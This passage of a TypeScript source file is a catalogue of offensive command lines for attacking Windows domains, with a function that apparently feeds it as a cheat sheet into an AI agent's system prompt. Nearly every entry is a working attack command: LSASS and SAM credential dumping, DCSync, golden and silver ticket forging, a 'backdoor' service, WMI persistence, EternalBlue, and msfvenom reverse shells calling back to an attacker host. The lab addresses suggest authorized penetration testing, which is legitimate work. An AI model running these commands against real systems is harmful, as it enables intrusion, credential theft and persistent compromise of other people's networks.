        name: 'Impacket — getArch',
        binary: 'impacket-getArch / getArch.py',
        notes: 'Detect target OS architecture (x86/x64) without credentials — useful for payload selection.',
        examples: [
            { label: 'Single target',                    cmd: 'impacket-getArch -target 192.168.56.20' },
            { label: 'Subnet scan',                      cmd: 'impacket-getArch -target 192.168.56.0/24' },
        ],
    },

    {
        name: 'Impacket — machine_role',
        binary: 'impacket-machine_role / machine_role.py',
        notes: 'Check if a target is a DC, member server, or workstation.',
        examples: [
            { label: 'Check role',                       cmd: 'impacket-machine_role {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
        ],
    },

    // ── IMPACKET — EXECUTION & LATERAL MOVEMENT ──────────────────────────────

    {
        name: 'Impacket — dcomexec',
        binary: 'impacket-dcomexec / dcomexec.py',
        notes: 'Lateral movement via DCOM — no service creation, no file drop. Stealthier than psexec. Objects: MMC20 (default), ShellWindows, ShellBrowserWindow.',
        examples: [
            { label: 'Exec via MMC20 (password)',         cmd: 'impacket-dcomexec {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 "whoami"' },
            { label: 'Exec via MMC20 (hash, PTH)',        cmd: 'impacket-dcomexec {{DOMAIN}}/{{USERNAME}}@192.168.56.20 -hashes :{{NTLM_HASH}} "whoami"' },
            { label: 'Exec via ShellWindows',             cmd: 'impacket-dcomexec -object ShellWindows {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 "cmd /c whoami > C:\\Windows\\Temp\\o.txt"' },
        ],
    },

    {
        name: 'Impacket — wmiquery',
        binary: 'impacket-wmiquery / wmiquery.py',
        notes: 'Execute WQL queries on a remote host over WMI.',
        examples: [
            { label: 'List running processes',           cmd: 'impacket-wmiquery {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 "SELECT * FROM Win32_Process"' },
            { label: 'OS info',                          cmd: 'impacket-wmiquery {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 "SELECT * FROM Win32_OperatingSystem"' },
            { label: 'Local user accounts',              cmd: 'impacket-wmiquery {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 "SELECT * FROM Win32_UserAccount WHERE LocalAccount=TRUE"' },
        ],
    },

    {
        name: 'Impacket — wmipersist',
        binary: 'impacket-wmipersist / wmipersist.py',
        notes: 'Install or remove WMI event subscription persistence on a remote host.',
        examples: [
            { label: 'Install VBS persistence',          cmd: 'impacket-wmipersist {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 install -name Updater -script payload.vbs' },
            { label: 'Remove persistence',               cmd: 'impacket-wmipersist {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 remove -name Updater' },
        ],
    },

    {
        name: 'Impacket — services',
        binary: 'impacket-services / services.py',
        notes: 'Manage Windows services remotely via SCMR over SMB.',
        examples: [
            { label: 'List services',                    cmd: 'impacket-services {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 list' },
            { label: 'Start service',                    cmd: 'impacket-services {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 start -name wuauserv' },
            { label: 'Stop service',                     cmd: 'impacket-services {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 stop -name wuauserv' },
            { label: 'Create + run malicious service',   cmd: 'impacket-services {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 create -name backdoor -display "Updater" -path "C:\\Windows\\Temp\\shell.exe"\nimpacket-services {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 start -name backdoor' },
            { label: 'Delete service (cleanup)',          cmd: 'impacket-services {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 delete -name backdoor' },
        ],
    },

    {
        name: 'Impacket — mssqlclient',
        binary: 'impacket-mssqlclient / mssqlclient.py',
        notes: 'Interactive MSSQL client. Use enable_xp_cmdshell followed by xp_cmdshell for OS command exec.',
        examples: [
            { label: 'Connect (Windows auth)',            cmd: 'impacket-mssqlclient {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}} -windows-auth' },
            { label: 'Connect (SQL auth)',                cmd: 'impacket-mssqlclient {{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
            { label: 'Connect (hash, PTH)',               cmd: 'impacket-mssqlclient {{DOMAIN}}/{{USERNAME}}@{{DC_IP}} -hashes :{{NTLM_HASH}} -windows-auth' },
            { label: 'In shell — enable xp_cmdshell',    cmd: 'enable_xp_cmdshell' },
            { label: 'In shell — OS command',            cmd: 'xp_cmdshell whoami' },
            { label: 'In shell — query',                 cmd: 'SELECT @@version' },
        ],
    },

    {
        name: 'Impacket — mssqlinstance',
        binary: 'impacket-mssqlinstance / mssqlinstance.py',
        notes: 'Discovers MSSQL instances via UDP broadcast on port 1434.',
        examples: [
            { label: 'Find MSSQL on subnet',             cmd: 'impacket-mssqlinstance 192.168.56.0/24' },
        ],
    },

    // ── IMPACKET — ACL & DOMAIN ATTACKS ─────────────────────────────────────

    {
        name: 'Impacket — rbcd',
        binary: 'impacket-rbcd / rbcd.py',
        notes: 'Configure msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD. Workflow: addcomputer → rbcd (write) → getST (S4U2Proxy).',
        examples: [
            { label: 'Set RBCD (grant ATTACKPC$ rights over TARGET)', cmd: 'impacket-rbcd -action write -delegate-from \'ATTACKPC$\' -delegate-to \'TARGET$\' {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}}' },
            { label: 'Read current RBCD settings',        cmd: 'impacket-rbcd -action read -delegate-to \'TARGET$\' {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}}' },
            { label: 'Remove RBCD (cleanup)',             cmd: 'impacket-rbcd -action flush -delegate-to \'TARGET$\' {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — owneredit',
        binary: 'impacket-owneredit / owneredit.py',
        notes: 'Read or change the owner of an AD object. Exploits WriteOwner ACE — once owner, grant yourself FullControl via dacledit.',
        examples: [
            { label: 'Read current owner',               cmd: 'impacket-owneredit -action read -target targetuser -dc-ip {{DC_IP}} \'{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}\'' },
            { label: 'Take ownership of object',         cmd: 'impacket-owneredit -action write -new-owner {{USERNAME}} -target targetuser -dc-ip {{DC_IP}} \'{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}\'' },
        ],
    },

    {
        name: 'Impacket — changepasswd',
        binary: 'impacket-changepasswd / changepasswd.py',
        notes: 'Change a user\'s password remotely. Also used to reset a password when you have ForceChangePassword rights.',
        examples: [
            { label: 'Change own password',              cmd: 'impacket-changepasswd {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}} -newpass \'NewP@ssw0rd!\'' },
            { label: 'Change with hash (PTH)',            cmd: 'impacket-changepasswd {{DOMAIN}}/{{USERNAME}}@{{DC_IP}} -hashes :{{NTLM_HASH}} -newpass \'NewP@ssw0rd!\'' },
        ],
    },

    {
        name: 'Impacket — dpapi',
        binary: 'impacket-dpapi / dpapi.py',
        notes: 'Decrypt DPAPI-protected secrets. Export domain backup key first — it decrypts any user\'s master keys.',
        examples: [
            { label: 'Export domain DPAPI backup key',   cmd: 'impacket-dpapi backupkeys -t {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}} --export' },
            { label: 'Decrypt masterkey with backup key', cmd: 'impacket-dpapi masterkey -file "%APPDATA%\\Microsoft\\Protect\\<SID>\\<GUID>" -pvk domain_backup.pvk' },
            { label: 'Decrypt credential file',          cmd: 'impacket-dpapi credential -file "%APPDATA%\\Microsoft\\Credentials\\<GUID>" -key <hex_masterkey>' },
        ],
    },

    // ── IMPACKET — INFRASTRUCTURE & MISC ─────────────────────────────────────

    {
        name: 'Impacket — reg',
        binary: 'impacket-reg / reg.py',
        notes: 'Read/write remote registry over SMB. Requires admin rights.',
        examples: [
            { label: 'Query registry value',             cmd: 'impacket-reg {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 query -keyName "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" -v ProductName' },
            { label: 'Enable WDigest (cleartext creds)', cmd: 'impacket-reg {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 add -keyName "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" -v UseLogonCredential -vt REG_DWORD -vd 1' },
            { label: 'Save hive (offline extract)',      cmd: 'impacket-reg {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 save -keyName HKLM\\SAM -o SAM.tmp' },
        ],
    },

    {
        name: 'Impacket — smbserver',
        binary: 'impacket-smbserver / smbserver.py',
        notes: 'Quick SMB server. Serve payloads to targets or capture NTLMv2 hashes from coerced authentications.',
        examples: [
            { label: 'Serve dir (also captures hashes)',  cmd: 'impacket-smbserver share /tmp/serve -smb2support' },
            { label: 'Authenticated share',               cmd: 'impacket-smbserver share /tmp/serve -smb2support -username {{USERNAME}} -password \'{{PASSWORD}}\'' },
            { label: 'Target fetches tool over SMB',      cmd: 'copy \\\\<attacker_ip>\\share\\nc.exe C:\\Windows\\Temp\\nc.exe' },
        ],
    },

    {
        name: 'Impacket — karmaSMB',
        binary: 'impacket-karmaSMB / karmaSMB.py',
        notes: 'Rogue SMB server answering ALL share requests — ideal for capturing hashes from Printer Bug, PetitPotam, DFSCoerce, etc.',
        examples: [
            { label: 'Start (listen on all)',             cmd: 'impacket-karmaSMB' },
        ],
    },

    {
        name: 'Impacket — exchanger',
        binary: 'impacket-exchanger / exchanger.py',
        notes: 'Exchange abuse via MAPI/NSPI. Enumerate mailboxes and global address list.',
        examples: [
            { label: 'List mailbox tables',               cmd: 'impacket-exchanger {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@MAIL_HOST nspi list-tables' },
            { label: 'Dump address book',                 cmd: 'impacket-exchanger {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@MAIL_HOST nspi dump-tables -count 100' },
        ],
    },

    {
        name: 'Impacket — mimikatz (remote SMB)',
        binary: 'impacket-mimikatz / mimikatz.py',
        notes: 'Opens an interactive mimikatz session on a remote host via SMB named pipe. Requires admin/SYSTEM on target.',
        examples: [
            { label: 'Open remote mimikatz shell',        cmd: 'impacket-mimikatz {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20' },
            { label: 'Open with hash (PTH)',              cmd: 'impacket-mimikatz {{DOMAIN}}/{{USERNAME}}@192.168.56.20 -hashes :{{NTLM_HASH}}' },
        ],
    },

    {
        name: 'Impacket — esentutl',
        binary: 'impacket-esentutl / esentutl.py',
        notes: 'Parse ESE databases (Extensible Storage Engine). Can extract data from an offline NTDS.dit.',
        examples: [
            { label: 'Show database info',               cmd: 'impacket-esentutl ntds.dit info' },
            { label: 'Export datatable',                 cmd: 'impacket-esentutl ntds.dit export -table datatable' },
        ],
    },

    {
        name: 'Impacket — ntfs-read',
        binary: 'impacket-ntfs-read / ntfs-read.py',
        notes: 'Read files directly from a raw NTFS partition image (e.g., a full disk dump).',
        examples: [
            { label: 'Read SAM from disk image',         cmd: 'impacket-ntfs-read disk.img /Windows/System32/config/SAM' },
            { label: 'Read NTDS.dit from disk image',    cmd: 'impacket-ntfs-read disk.img /Windows/NTDS/ntds.dit' },
        ],
    },

    {
        name: 'Impacket — registry-read',
        binary: 'impacket-registry-read / registry-read.py',
        notes: 'Parse offline Windows registry hive files exported from a live or dead system.',
        examples: [
            { label: 'Read SAM hive',                    cmd: 'impacket-registry-read SAM' },
            { label: 'Read SYSTEM hive',                 cmd: 'impacket-registry-read SYSTEM' },
        ],
    },

    {
        name: 'Impacket — sambaPipe (CVE-2017-7494)',
        binary: 'impacket-sambaPipe / sambaPipe.py',
        notes: 'Exploits SambaCry (CVE-2017-7494) — RCE by uploading a malicious .so to a writable Samba share.',
        examples: [
            { label: 'Exploit SambaCry',                  cmd: 'impacket-sambaPipe -so /tmp/payload.so {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20' },
        ],
    },

    // ── KERBEROS & ACTIVE DIRECTORY ─────────────────────────────────────────

    {
        name: 'Certipy',
        binary: 'certipy',
        notes: 'All commands use -u UPN format (user@domain), not DOMAIN\\user.',
        examples: [
            { label: 'Find vulnerable templates',         cmd: 'certipy find -u {{UPN}} -p \'{{PASSWORD}}\' -dc-ip {{DC_IP}} -vulnerable -stdout' },
            { label: 'Find — output JSON',                cmd: 'certipy find -u {{UPN}} -p \'{{PASSWORD}}\' -dc-ip {{DC_IP}} -output certipy_out' },
            { label: 'ESC1 — request cert as DA',        cmd: 'certipy req -u {{UPN}} -p \'{{PASSWORD}}\' -dc-ip {{DC_IP}} -ca LAB-CA -template VulnTemplate -upn administrator@{{DOMAIN}}' },
            { label: 'ESC4 — make template vulnerable',  cmd: 'certipy template -u {{UPN}} -p \'{{PASSWORD}}\' -dc-ip {{DC_IP}} -template VulnTemplate -save-old' },
            { label: 'ESC8 — relay to ADCS HTTP',        cmd: 'certipy relay -ca {{DC_IP}} -template DomainController' },
            { label: 'Authenticate with cert → NTLM',   cmd: 'certipy auth -pfx administrator.pfx -dc-ip {{DC_IP}}' },
            { label: 'Shadow credentials (ESC+RBCD)',    cmd: 'certipy shadow auto -u {{UPN}} -p \'{{PASSWORD}}\' -account DC01$ -dc-ip {{DC_IP}}' },
            { label: 'Account (add shadow cred to acct)', cmd: 'certipy account update -u {{UPN}} -p \'{{PASSWORD}}\' -target targetuser -upn administrator@{{DOMAIN}} -dc-ip {{DC_IP}}' },
        ],
    },

    {
        name: 'Rubeus',
        binary: 'Rubeus.exe',
        notes: 'Windows only. Requires no local admin for roasting/requesting. Requires admin for dump/monitor.',
        examples: [
            { label: 'Kerberoast all',                    cmd: 'Rubeus.exe kerberoast /outfile:kerb.hashes /nowrap' },
            { label: 'Kerberoast — RC4 only (faster crack)', cmd: 'Rubeus.exe kerberoast /rc4opsec /outfile:kerb.hashes /nowrap' },
            { label: 'AS-REP roast',                      cmd: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes /nowrap' },
            { label: 'Request TGT (password)',            cmd: 'Rubeus.exe asktgt /user:{{USERNAME}} /password:{{PASSWORD}} /domain:{{DOMAIN}} /enctype:aes256 /ptt' },
            { label: 'Request TGT (NTLM hash)',           cmd: 'Rubeus.exe asktgt /user:{{USERNAME}} /rc4:{{NTLM_HASH}} /domain:{{DOMAIN}} /ptt' },
            { label: 'PTT — inject .kirbi ticket',        cmd: 'Rubeus.exe ptt /ticket:ticket.kirbi' },
            { label: 'PTT — inject base64 blob',          cmd: 'Rubeus.exe ptt /ticket:<base64blob>' },
            { label: 'S4U2Self + S4U2Proxy (constrained)', cmd: 'Rubeus.exe s4u /user:svc_account /rc4:{{NTLM_HASH}} /impersonateuser:Administrator /msdsspn:cifs/target.{{DOMAIN}} /ptt' },
            { label: 'Dump all tickets (admin)',          cmd: 'Rubeus.exe dump /nowrap' },
            { label: 'Dump tickets for user',             cmd: 'Rubeus.exe dump /user:{{USERNAME}} /nowrap' },
            { label: 'Monitor — catch new TGTs',         cmd: 'Rubeus.exe monitor /interval:5 /nowrap' },
            { label: 'Harvest — steal TGT via tgtdeleg', cmd: 'Rubeus.exe tgtdeleg /target:{{DC_IP}}' },
            { label: 'Renew TGT',                        cmd: 'Rubeus.exe renew /ticket:<base64blob> /ptt' },
            { label: 'Convert .ccache to .kirbi',        cmd: 'Rubeus.exe describe /ticket:<base64blob>' },
        ],
    },

    {
        name: 'Mimikatz',
        binary: 'mimikatz.exe',
        notes: 'Requires elevated privileges (SYSTEM / local Admin) for most commands. Run as: mimikatz.exe "command" "exit"',
        examples: [
            { label: 'Enable debug privilege',            cmd: 'privilege::debug' },
            { label: 'Dump LSASS (plaintext + hashes)',  cmd: 'sekurlsa::logonpasswords' },
            { label: 'Dump LSASS from minidump file',    cmd: 'sekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords' },
            { label: 'Pass-the-Hash',                     cmd: 'sekurlsa::pth /user:{{USERNAME}} /domain:{{DOMAIN}} /ntlm:{{NTLM_HASH}} /run:cmd.exe' },
            { label: 'DCSync — specific user',           cmd: 'lsadump::dcsync /domain:{{DOMAIN}} /user:krbtgt' },
            { label: 'DCSync — all users',               cmd: 'lsadump::dcsync /domain:{{DOMAIN}} /all /csv' },
            { label: 'Golden ticket (forge)',             cmd: 'kerberos::golden /user:Administrator /domain:{{DOMAIN}} /sid:<domain_sid> /krbtgt:<krbtgt_ntlm> /ptt' },
            { label: 'Silver ticket (forge)',             cmd: 'kerberos::golden /user:Administrator /domain:{{DOMAIN}} /sid:<domain_sid> /target:server.{{DOMAIN}} /service:cifs /rc4:<service_ntlm> /ptt' },
            { label: 'Dump SAM (local accounts)',         cmd: 'lsadump::sam' },
            { label: 'Dump LSA secrets',                  cmd: 'lsadump::secrets' },
            { label: 'List Kerberos tickets',             cmd: 'kerberos::list /export' },
            { label: 'Inject .kirbi ticket',              cmd: 'kerberos::ptt ticket.kirbi' },
            { label: 'Token impersonation — list',       cmd: 'token::list' },
            { label: 'Token impersonation — elevate',    cmd: 'token::elevate' },
            { label: 'DPAPI — master key',               cmd: 'dpapi::masterkey /in:"%appdata%\\Microsoft\\Protect\\<SID>\\<GUID>" /rpc' },
        ],
    },

    // ── SCCM ─────────────────────────────────────────────────────────────────

    {
        name: 'SCCMHunter',
        binary: 'sccmhunter',
        notes: 'Discovers and attacks SCCM/ConfigMgr infrastructure. Requires valid domain credentials.',
        examples: [
            { label: 'Find SCCM infrastructure',          cmd: 'sccmhunter find -u {{USERNAME}} -p \'{{PASSWORD}}\' -d {{DOMAIN}} -dc-ip {{DC_IP}}' },
            { label: 'Enumerate SCCM hierarchy',          cmd: 'sccmhunter smb -u {{USERNAME}} -p \'{{PASSWORD}}\' -d {{DOMAIN}} -dc-ip {{DC_IP}}' },
            { label: 'Enum admin users',                  cmd: 'sccmhunter show -users' },
            { label: 'Dump NAA credentials',              cmd: 'sccmhunter dpapi -u {{USERNAME}} -p \'{{PASSWORD}}\' -d {{DOMAIN}} -dc-ip {{DC_IP}}' },
        ],
    },

    {
        name: 'Misconfiguration Manager',
        binary: 'MisconfigurationManager (PowerShell module)',
        notes: 'PowerShell-based SCCM attack toolkit. Import-Module then run individual functions.',
        examples: [
            { label: 'Import module',                     cmd: 'Import-Module .\\MisconfigurationManager.ps1' },
            { label: 'Enumerate SCCM hierarchy',          cmd: 'Invoke-HierarchyEnumeration -SiteCode <CODE> -SMSProvider <MP_HOST>' },
            { label: 'NTLM coerce via SCCM',             cmd: 'Invoke-AdminServiceAbuseRelay -SiteCode <CODE> -SMSProvider <MP_HOST>' },
            { label: 'Extract credentials',              cmd: 'Get-SiteCredentials -SiteCode <CODE> -SMSProvider <MP_HOST>' },
        ],
    },

    // ── LATERAL MOVEMENT & C2 ────────────────────────────────────────────────

    {
        name: 'Evil-WinRM',
        binary: 'evil-winrm',
        notes: 'Requires WinRM (TCP 5985/5986) open and user in Remote Management Users or Administrators.',
        examples: [
            { label: 'Connect (password)',                cmd: 'evil-winrm -i {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\'' },
            { label: 'Connect (hash, PTH)',               cmd: 'evil-winrm -i {{DC_IP}} -u {{USERNAME}} -H {{NTLM_HASH}}' },
            { label: 'Connect with SSL (5986)',           cmd: 'evil-winrm -i {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -S' },
            { label: 'Upload file',                       cmd: '# In shell:\nupload /local/path/file.exe C:\\Windows\\Temp\\file.exe' },
            { label: 'Download file',                     cmd: '# In shell:\ndownload C:\\Windows\\System32\\config\\SAM /tmp/SAM' },
            { label: 'Load PowerShell script',            cmd: '# In shell:\nInvoke-Binary /local/binary.exe arg1 arg2' },
        ],
    },

    {
        name: 'Ligolo-ng',
        binary: 'proxy (attacker) + agent (target)',
        notes: 'Attacker: run proxy. Target: run agent. Traffic routes transparently through a tun interface — no SOCKS needed.',
        examples: [
            { label: 'Start proxy (attacker, Linux)',     cmd: 'sudo ./proxy -selfcert -laddr 0.0.0.0:11601' },
            { label: 'Run agent (target, Windows)',       cmd: '.\\agent.exe -connect <attacker_ip>:11601 -ignore-cert' },
            { label: 'Run agent (target, Linux)',         cmd: './agent -connect <attacker_ip>:11601 -ignore-cert' },
            { label: 'proxy UI — select session',        cmd: 'session\n[select number]' },
            { label: 'proxy UI — start tunnel',          cmd: 'start' },
            { label: 'Add route to internal subnet',     cmd: 'sudo ip route add 192.168.56.0/24 dev ligolo' },
            { label: 'Add listener for reverse shells',  cmd: 'listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444' },
        ],
    },

    {
        name: 'Metasploit',
        binary: 'msfconsole / msfvenom',
        notes: 'Use msfvenom for payload generation only; prefer Impacket/NetExec for execution.',
        examples: [
            { label: 'msfvenom — Windows reverse shell exe', cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe' },
            { label: 'msfvenom — Windows meterpreter exe',   cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o meter.exe' },
            { label: 'msfvenom — PowerShell one-liner',     cmd: 'msfvenom -p cmd/windows/reverse_powershell LHOST=<attacker_ip> LPORT=4444' },
            { label: 'msfconsole — multi/handler',          cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; run"' },
            { label: 'ms17-010 (EternalBlue)',              cmd: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {{DC_IP}}\nset LHOST <attacker_ip>\nrun' },
        ],
    },

    // ── POST-EXPLOITATION ────────────────────────────────────────────────────

    {
        name: 'WinPEAS / LinPEAS',
        binary: 'winPEASx64.exe / linpeas.sh',
        examples: [
            { label: 'WinPEAS — full run',                cmd: '.\\winPEASx64.exe' },
            { label: 'WinPEAS — quiet (less spam)',       cmd: '.\\winPEASx64.exe quiet' },
            { label: 'WinPEAS — specific check only',     cmd: '.\\winPEASx64.exe systeminfo' },
            { label: 'LinPEAS — run (download + exec)',   cmd: 'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash' },
            { label: 'LinPEAS — local run',               cmd: 'chmod +x linpeas.sh && ./linpeas.sh 2>/dev/null | tee linpeas_out.txt' },
        ],
    },

    {
        name: 'LaZagne',
        binary: 'lazagne.exe / lazagne.py',
        notes: 'Extracts plaintext credentials from browsers, apps, Windows credential store, etc. Run as admin for full output.',
        examples: [
            { label: 'Dump all credential sources',       cmd: 'lazagne.exe all' },
            { label: 'Browsers only',                     cmd: 'lazagne.exe browsers' },
            { label: 'Windows credential manager',        cmd: 'lazagne.exe windows' },
            { label: 'Write output to file',              cmd: 'lazagne.exe all -oN -output C:\\Temp\\' },
        ],
    },

    {
        name: 'Hashcat',
        binary: 'hashcat',
        notes: 'Always set -m (mode). Common: NTLM=1000, Net-NTLMv1=5500, Net-NTLMv2=5600, Kerberoast=13100, AS-REP=18200, DCC2=2100. Use --show to display cracked hashes.',
        examples: [
            { label: 'NTLM — wordlist',                   cmd: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt' },
            { label: 'NTLM — wordlist + best64 rules',    cmd: 'hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule' },
            { label: 'Net-NTLMv2 — wordlist',             cmd: 'hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt' },
            { label: 'Kerberoast — wordlist',             cmd: 'hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt' },
            { label: 'AS-REP Roast — wordlist',           cmd: 'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt' },
            { label: 'DCC2 / MsCache2',                  cmd: 'hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt' },
            { label: 'NTLM — mask attack (8-char alpha)', cmd: 'hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a' },
            { label: 'Show cracked hashes',               cmd: 'hashcat -m 1000 hashes.txt --show' },
        ],
    },

    {
        name: 'John the Ripper',
        binary: 'john',
        notes: 'CPU-based cracker. Slower than hashcat on GPU but useful when GPU is unavailable.',
        examples: [
            { label: 'Crack with wordlist',               cmd: 'john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt' },
            { label: 'Crack Net-NTLMv2',                  cmd: 'john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt' },
            { label: 'Show cracked passwords',            cmd: 'john hashes.txt --show' },
            { label: 'Incremental brute-force',           cmd: 'john hashes.txt --incremental=alnum' },
        ],
    },
];

// Compact cheat sheet injected into the system prompt.
export function buildToolCheatSheet(): string {
    return toolSyntaxList.map(t => {
        const noteStr = t.notes ? `  NOTE: ${t.notes}\n` : '';
        const exStr = t.examples.map(e => `  ${e.label}:\n    ${e.cmd}`).join('\n');
        return `### ${t.name} (\`${t.binary}\`)\n${noteStr}${exStr}`;
    }).join('\n\n');
}

